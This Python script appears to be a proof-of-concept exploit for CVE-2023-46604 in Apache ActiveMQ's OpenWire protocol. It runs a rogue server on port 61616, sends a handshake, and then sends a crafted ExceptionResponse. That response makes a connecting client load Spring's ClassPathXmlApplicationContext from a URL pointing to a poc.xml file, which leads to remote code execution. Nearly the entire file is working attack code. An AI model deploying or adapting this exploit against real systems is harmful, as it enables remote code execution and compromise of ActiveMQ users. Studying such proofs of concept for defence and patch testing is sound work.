import socket
import struct

OPENWIRE_COMMAND_LENGTH = 4

OPENWIRE_PORT = 61616

"""
Really nice analysis: https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis
"""

def convert_data_to_ints(data, big_endian=True):
    int_count = len(data) // 4  # Assuming uint is 4 bytes long !!!
    fmt = ">" if big_endian else "<"
    fmt += "I" * int_count
    return struct.unpack(fmt, data[:int_count * 4])


def read_next_message_length(s):
    message_response = receive(s, OPENWIRE_COMMAND_LENGTH)
    # Big endian format
    message_length = convert_data_to_ints(message_response)[0]
    print("Will be reading " + str(message_length) + " bytes")
    return message_length

def receive(sock, message_length):
    chunks = []
    bytes_recd = 0
    while (bytes_recd < message_length):
        chunk = sock.recv(message_length - bytes_recd)
        if chunk == b'':
            raise RuntimeError("socket connection broken")
        chunks.append(chunk)
        bytes_recd = bytes_recd + len(chunk)
    return b''.join(chunks)

def send(sock, msg):
    message_length = len(msg)
    totalsent = 0
    while totalsent < message_length:
        payload_to_send = msg[totalsent:]
        sent = sock.send(payload_to_send)
        if sent == 0:
            raise RuntimeError("socket connection broken")
        totalsent = totalsent + sent


def malicious_openwire_cmd():
    clazz = 'org.springframework.context.support.ClassPathXmlApplicationContext'

    # 1 byte to check OpenWire command, this one is ExceptionResponse.
    data = struct.pack('B', 31)

    # Up to here, an exception is thrown in line BaseCommandMarshaller#looseUnmarshall. Line 100

    # 4 bytes are expected for command ID.
    data += struct.pack('!I', 31)

    # 1 byte if response is needed.
    data += struct.pack('B', 0)

    # 4 bytes for a correlation id needed.
    data += struct.pack('!I', 8)


    # Right here, we start encoding the Throwable to be read.
    # 1 byte for an if that needs to be true
    data += struct.pack('B', 1)

    # Here comes the exception class. It needs to be a SpringBean to load.
    # 1 Byte to check if there's a string present.
    data += struct.pack('B', 1)

    # The encoded String in UTF-8 + lenght
    # 2 bytes representing the length of the UTF-8 string:
    data += struct.pack('>H', len(clazz))
    # following bytes in UTF-8
    data += clazz.encode('utf-8')

    # Now comes another string, this one is the constructor.
    # How does this string accomplish the exploit?!?!?
    get_uri = 'http://localhost:8888/poc.xml'  # Replace with your actual value

    data += struct.pack('B', 1)
    data += struct.pack('>H', len(get_uri))
    data += get_uri.encode('utf-8')

    # It needs a stacktrace info. We'll use zero
    data += struct.pack('>H', 0)

    # As there is a recursive call, we need to set a byte as false to stop the recursion
    data += struct.pack('B', 0)


    # SizePrefixDisabled = false, then we need to send the first 4 bytes as the length
    # This is NEEDED, since if it isn't present, this fails much before the BaseCommandMarshaller
    message_length = len(data)

    message_prefix = struct.pack('!I', message_length)

    data = message_prefix + data
    print(data)

    return data

def handshake_command():
    return b'\x00\x00\x01\x4d\x01\x41\x63\x74\x69\x76\x65\x4d\x51\x00\x00\x00' \
b'\x0c\x01\x00\x00\x01\x3b\x00\x00\x00\x0d\x00\x11\x53\x74\x61\x63' \
b'\x6b\x54\x72\x61\x63\x65\x45\x6e\x61\x62\x6c\x65\x64\x01\x01\x00' \
b'\x0f\x50\x6c\x61\x74\x66\x6f\x72\x6d\x44\x65\x74\x61\x69\x6c\x73' \
b'\x09\x00\x04\x4a\x61\x76\x61\x00\x0c\x43\x61\x63\x68\x65\x45\x6e' \
b'\x61\x62\x6c\x65\x64\x01\x01\x00\x04\x48\x6f\x73\x74\x09\x00\x09' \
b'\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x00\x11\x54\x63\x70\x4e\x6f' \
b'\x44\x65\x6c\x61\x79\x45\x6e\x61\x62\x6c\x65\x64\x01\x01\x00\x12' \
b'\x53\x69\x7a\x65\x50\x72\x65\x66\x69\x78\x44\x69\x73\x61\x62\x6c' \
b'\x65\x64\x01\x00\x00\x09\x43\x61\x63\x68\x65\x53\x69\x7a\x65\x05' \
b'\x00\x00\x04\x00\x00\x0c\x50\x72\x6f\x76\x69\x64\x65\x72\x4e\x61' \
b'\x6d\x65\x09\x00\x08\x41\x63\x74\x69\x76\x65\x4d\x51\x00\x14\x54' \
b'\x69\x67\x68\x74\x45\x6e\x63\x6f\x64\x69\x6e\x67\x45\x6e\x61\x62' \
b'\x6c\x65\x64\x01\x00\x00\x0c\x4d\x61\x78\x46\x72\x61\x6d\x65\x53' \
b'\x69\x7a\x65\x06\x7f\xff\xff\xff\xff\xff\xff\xff\x00\x15\x4d\x61' \
b'\x78\x49\x6e\x61\x63\x74\x69\x76\x69\x74\x79\x44\x75\x72\x61\x74' \
b'\x69\x6f\x6e\x06\x00\x00\x00\x00\x00\x00\x75\x30\x00\x20\x4d\x61' \
b'\x78\x49\x6e\x61\x63\x74\x69\x76\x69\x74\x79\x44\x75\x72\x61\x74' \
b'\x69\x6f\x6e\x49\x6e\x69\x74\x61\x6c\x44\x65\x6c\x61\x79\x06\x00' \
b'\x00\x00\x00\x00\x00\x27\x10\x00\x0f\x50\x72\x6f\x76\x69\x64\x65' \
b'\x72\x56\x65\x72\x73\x69\x6f\x6e\x09\x00\x06\x35\x2e\x31\x36\x2e\x30'


def send_openwire_command(s, addr):
    # https://activemq.apache.org/openwire-version-2-specification

    # Read the OpenWire info command
    message_length = read_next_message_length(s)
    response = receive(s, message_length)
    print("Received from Client: " + str(response) + "\n\n")

    # Send the OpenWire info command
    send(s, handshake_command())

    # Now send the malicious code with the response
    command = malicious_openwire_cmd()
    send(s, command)

    # Read a response and shutdown the connection:
    message_length = read_next_message_length(s)
    response = receive(s, message_length)
    print("Received from Client: " + str(response) + "\n\n")

    s.shutdown(socket.SHUT_RDWR)
    s.close()

def main():
    # Socket of family Network, over TCP
    openwire_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the host and port
    openwire_socket.bind(("localhost", OPENWIRE_PORT))
    openwire_socket.listen()

    # Accept AMQP connection
    conn, addr = openwire_socket.accept()
    send_openwire_command(conn, addr)

    openwire_socket.shutdown(socket.SHUT_RDWR)
    openwire_socket.close()

if __name__ == '__main__':
    main()
